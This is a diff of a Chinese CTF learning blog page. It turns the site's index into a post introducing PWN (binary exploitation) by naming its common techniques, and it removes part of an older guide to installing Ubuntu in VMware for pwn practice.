@@ -37,30 +37,186 @@
 </style>
 
 
-  <meta name="description" content="ʕ´•ᴥ• ʔ">
-<meta property="og:type" content="website">
-<meta property="og:title" content="mvegetable&#39;blog">
-<meta property="og:url" content="https://rjcnb666.github.io/index.html">
+  <meta name="description" content="二进制基础一.什么是二进制什么是Pwn?PWN 原指“own”（控制、攻破）的俚语变体，最初出现在黑客文化中。后被 CTF（Capture The Flag）竞赛广泛使用，用来指代利用程序二进制漏洞实现控制、提权、信息泄露等攻击手段的一类题型。 PWN ≈ 利用二进制程序漏洞控制程序流程 核心手段：栈溢出、格式化字符串、堆溢出、UAF、整数溢出、内核控制等 最终目标：执行恶意代码或泄露敏感数据 p">
+<meta property="og:type" content="article">
+<meta property="og:title" content="二进制基础">
+<meta property="og:url" content="https://rjcnb666.github.io/2026/05/06/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%9F%BA%E7%A1%80%EF%BC%88pwn%EF%BC%89/index.html">
 <meta property="og:site_name" content="mvegetable&#39;blog">
-<meta property="og:description" content="ʕ´•ᴥ• ʔ">
+<meta property="og:description" content="二进制基础一.什么是二进制什么是Pwn?PWN 原指“own”（控制、攻破）的俚语变体，最初出现在黑客文化中。后被 CTF（Capture The Flag）竞赛广泛使用，用来指代利用程序二进制漏洞实现控制、提权、信息泄露等攻击手段的一类题型。 PWN ≈ 利用二进制程序漏洞控制程序流程 核心手段：栈溢出、格式化字符串、堆溢出、UAF、整数溢出、内核控制等 最终目标：执行恶意代码或泄露敏感数据 p">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251218220617279.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251218221805738.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251218220651871.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251218233038240.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251218220651871.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251218234530468.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251221011736602.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251221012757842.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251221013224590.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251219013405106.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251219015558503.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/c4956788-f036-4f3e-8ad7-6547ecdf6173.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251219015558503.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260424195230281.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251221135031330.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251221134830143.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251221135135318.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251221135257242.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251221135345951.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251221135641245.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251221135851297.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251221140616061.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251221140737432.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251221140941506.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251221141119912.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251221141201936.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251221141334569.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251221141601974.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251221141717557.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251221141803692.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251221142209536.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260420230716622.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260420230933622.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260420231054136.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260420231804189.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/download_image.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260422221726914.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260422221801361.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260422222219273.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260422222602268.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260422222612607.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260422222644347.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260421001421184.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260421001524931.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260421001642561.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260421001805980.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260421001918097.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260422221443325.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260422103316611.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260422103824632.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260422105147525.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260422114447752.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260422114500917.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260422123111444.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260422130948316.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260422131825230.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260422131704681.png">
+<meta property="og:image" content="c:\Users\28580\AppData\Roaming\Typora\typora-user-images\image-20260422100106216.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260422212507789.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260422213436842.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/download_image.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/download_image.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/download_image2.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260425085103319.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/download_image4.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/download_image5.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260423205441521.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260423211014705.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260423211014705.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260423202734148.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260424004637020.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260424004540543.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260426071940234.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260426072556049.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260426072610268.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260426073736984.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260424010551476.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260425073209109.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260425073300573.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260425073446848.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260421000853985.png">
+<meta property="og:image" content="c:\Users\28580\AppData\Roaming\Typora\typora-user-images\image-20260421000929122.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260421001030985.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260421001052260.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260426005800992.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260426005715238.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260426010308618.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260426010323917.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260426010838847.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260426010854234.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260426022716321.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260426015405595.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260426015903203.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260426015946684.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260426020113789.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260426020351365.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260426020551374.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260426023401721.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260426023500048.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260423020900497.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260423020936971.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260423022540386.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260423024244366.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260423024410879.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260423033046612.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260423033128026.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260423033227443.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260423033411944.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260423033341997.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260423033555278.png">
+<meta property="og:image" content="c:\Users\28580\AppData\Roaming\Typora\typora-user-images\image-20260425025315020.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260425063803466.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260425063913195.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260425064053105.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260425065118985.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260425065646331.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260425065756846.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260420235019723.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260420235132581.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260420235132581.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260420235159686.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260420235240408.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260425071828454.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260425074015088.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260425075905802.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260425075844756.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260420233248179.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260420233316152.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260420233326089.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260420233413425.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260423043623005.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260423043852458.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260423043924893.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260423044044922.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260423044108615.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260423044212589.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260423044243120.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260423044316490.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260423044401922.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260423044434069.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260423044503585.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260423044517434.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260423044623564.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260423044655550.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260423044716954.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260423044742031.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260423044811431.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/32ce543e-b4b1-414b-bd5b-9d1877b19f2e.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260425102913485.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260425102958410.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260425103110697.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20260425103130102.png">
+<meta property="article:published_time" content="2026-05-06T13:39:44.000Z">
+<meta property="article:modified_time" content="2026-05-06T13:47:54.875Z">
 <meta property="article:author" content="JC">
+<meta property="article:tag" content="PWN">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251218220617279.png">
 
-<link rel="canonical" href="https://rjcnb666.github.io/">
+<link rel="canonical" href="https://rjcnb666.github.io/2026/05/06/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%9F%BA%E7%A1%80%EF%BC%88pwn%EF%BC%89/">
 
 
 <script id="page-configurations">
   // https://hexo.io/docs/variables.html
   CONFIG.page = {
     sidebar: "",
-    isHome : true,
-    isPost : false,
+    isHome : false,
+    isPost : true,
     lang   : 'zh-CN'
   };
 </script>
 
-  <title>mvegetable'blog</title>
+  <title>二进制基础 | mvegetable'blog</title>
   
 
 
@@ -213,9 +369,10 @@
         <div class="content-wrap">
           
 
-          <div class="content index posts-expand">
+          <div class="content post posts-expand">
             
-      
+
+    
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
@@ -231,10 +388,9 @@
       <meta itemprop="name" content="mvegetable'blog">
     </span>
       <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2026/05/06/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%9F%BA%E7%A1%80%EF%BC%88pwn%EF%BC%89/" class="post-title-link" itemprop="url">二进制基础</a>
-        </h2>
+        <h1 class="post-title" itemprop="name headline">
+          二进制基础
+        </h1>
 
         <div class="post-meta">
             <span class="post-meta-item">
@@ -256,7 +412,14 @@
                 </span>
             </span>
 
-          <br>
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="far fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
             <span class="post-meta-item" title="本文字数">
               <span class="post-meta-item-icon">
                 <i class="far fa-file-word"></i>
@@ -274,7 +437,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="二进制基础"><a href="#二进制基础" class="headerlink" title="二进制基础"></a>二进制基础</h1><h2 id="一-什么是二进制"><a href="#一-什么是二进制" class="headerlink" title="一.什么是二进制"></a>一.什么是二进制</h2><h3 id="什么是Pwn"><a href="#什么是Pwn" class="headerlink" title="什么是Pwn?"></a>什么是<code>Pwn</code>?</h3><p>PWN 原指“own”（控制、攻破）的俚语变体，最初出现在黑客文化中。后被 CTF（Capture The Flag）竞赛广泛使用，用来指代利用程序二进制漏洞实现控制、提权、信息泄露等攻击手段的一类题型。</p>
+        <h1 id="二进制基础"><a href="#二进制基础" class="headerlink" title="二进制基础"></a>二进制基础</h1><h2 id="一-什么是二进制"><a href="#一-什么是二进制" class="headerlink" title="一.什么是二进制"></a>一.什么是二进制</h2><h3 id="什么是Pwn"><a href="#什么是Pwn" class="headerlink" title="什么是Pwn?"></a>什么是<code>Pwn</code>?</h3><p>PWN 原指“own”（控制、攻破）的俚语变体，最初出现在黑客文化中。后被 CTF（Capture The Flag）竞赛广泛使用，用来指代利用程序二进制漏洞实现控制、提权、信息泄露等攻击手段的一类题型。</p>
 <p><strong>PWN ≈ 利用二进制程序漏洞控制程序流程</strong></p>
 <p><strong>核心手段：栈溢出、格式化字符串、堆溢出、UAF、整数溢出、内核控制等</strong></p>
 <p><strong>最终目标：执行恶意代码或泄露敏感数据</strong></p>
@@ -4356,1408 +4519,34 @@
 
 
 
-      
     </div>
 
     
     
     
+
       <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
+          <div class="post-tags">
+              <a href="/tags/PWN/" rel="tag"># PWN</a>
+          </div>
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://rjcnb666.github.io/2025/12/10/pwn%E7%8E%AF%E5%A2%83%EF%BC%88%E8%99%9A%E6%8B%9F%E6%9C%BA%EF%BC%89/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/tou.jpg">
-      <meta itemprop="name" content="JC">
-      <meta itemprop="description" content="ʕ´•ᴥ• ʔ">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="mvegetable'blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2025/12/10/pwn%E7%8E%AF%E5%A2%83%EF%BC%88%E8%99%9A%E6%8B%9F%E6%9C%BA%EF%BC%89/" class="post-title-link" itemprop="url">未命名</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2025-12-10 03:12:13 / 修改时间：12:09:09" itemprop="dateCreated datePublished" datetime="2025-12-10T03:12:13+08:00">2025-12-10</time>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>2.1k</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="pwn-环境"><a href="#pwn-环境" class="headerlink" title="pwn 环境"></a>pwn 环境</h1><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>为了帮助大家更快的了解入门pwn，我在这里教大家搭建一下Pwn环境。认真看下去，不要嫌麻烦，跟着一步一步地走一定搭成功的。学长重新搭了一遍，应该没什么问题。期待在后面与大家相遇。</p>
-<h2 id="ubuntu-24-04"><a href="#ubuntu-24-04" class="headerlink" title="ubuntu 24.04:"></a>ubuntu 24.04:</h2><p>这里搭建的是ubuntu 24.04版本，大家也可以尝试其他版本。</p>
-<p><a target="_blank" rel="noopener" href="https://ubuntu.com/download/desktop">Download Ubuntu Desktop | Ubuntu</a></p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251208175549175.png" alt="image-20251208175549175"></p>
-<p>从官网获取镜像</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251208180007680.png" alt="image-20251208180007680"></p>
-<p>如果没有vmvare的话可以从这里下载</p>
-<p>通过网盘分享的文件：VMware-workstation-full-17.6.1-24319023.exe<br>链接: <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1t65qAD2Fkt4Qm-krvvgoDQ?pwd=akeq">https://pan.baidu.com/s/1t65qAD2Fkt4Qm-krvvgoDQ?pwd=akeq</a> 提取码: akeq </p>
-<p>打开你的<code>vmware</code></p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251208180050753.png" alt="image-20251208180050753"></p>
-<p>新建虚拟机</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251208180815158.png" alt="image-20251208180815158"></p>
-<p>选择自定义 下一步</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251208180840922.png" alt="image-20251208180840922"></p>
-<p>下一步</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251208180939845.png" alt="image-20251208180939845"></p>
-<p>选择刚刚下载好的.iso镜像文件 下一步</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251208181225726.png" alt="image-20251208181225726"></p>
-<p>选一个你喜欢的名字 下一步</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251208181433019.png" alt="image-20251208181433019"></p>
-<p>起个名 然后位置放在文件夹下 下一步</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251208233922173.png" alt="image-20251208233922137"></p>
-<p>这里由于24.04版本对资源要求较高，内存最好是&gt;&#x3D;4G</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251208234747305.png" alt="image-20251208234747305"></p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251208235025624.png" alt="image-20251208235025624"></p>
-<p>下一步</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251208235102627.png" alt="image-20251208235102627"></p>
-<p>下一步</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251208235441279.png" alt="image-20251208235441279"></p>
-<p>下一步</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251208235459502.png" alt="image-20251208235459502"></p>
-<p>下一步</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251208235611212.png" alt="image-20251208235611212"></p>
-<p>这里为虚拟磁盘预留足够的空间。</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251208235648477.png" alt="image-20251208235648477"></p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251208235658754.png" alt="image-20251208235658754"></p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251209000229051.png" alt="image-20251209000229051"></p>
-<p>编辑虚拟机</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251209000209578.png" alt="image-20251209000209578"></p>
-<p>进行如上配置</p>
-<p>打开虚拟机</p>
-<p>按enter</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251209000749346.png" alt="image-20251209000749346"></p>
-<p>一路下一步</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251209000837079.png" alt="image-20251209000837079"></p>
-<p>到这个页面的时候改成extended selection</p>
-<p>下一步</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251209001113643.png" alt="image-20251209001113643"></p>
-<p>这里随便取个名字 下一步</p>
-<p>然后下一步按install</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251209001205487.png" alt="image-20251209001205487"></p>
-<p>开始安装</p>
-<p>需要等待一会</p>
-<p>如果出现卡死的情况可以尝试关闭虚拟机 然后打开虚拟机设置，显示，取消加速3D图像</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251209231925515.png" alt="image-20251209231925515"></p>
-<p>不要着急 学长用初中的老电脑重新搭了一遍 也是会出现一些状况 慢慢来就好。</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251209231739398.png" alt="image-20251209231739398"></p>
-<p>这里重启一下就安装成功了</p>
-<h3 id="工具："><a href="#工具：" class="headerlink" title="工具："></a>工具：</h3><p>右键open the ternal</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251209232216675.png" alt="image-20251209232216675"></p>
-<p>后面无脑复制就好</p>
-<p>虚拟机里的复制粘贴是ctrl +shift +c &#x2F;v</p>
-<h4 id="vim"><a href="#vim" class="headerlink" title="vim:"></a>vim:</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install vim -y</span><br></pre></td></tr></table></figure>
-
-<p>密码是你刚刚设置过的</p>
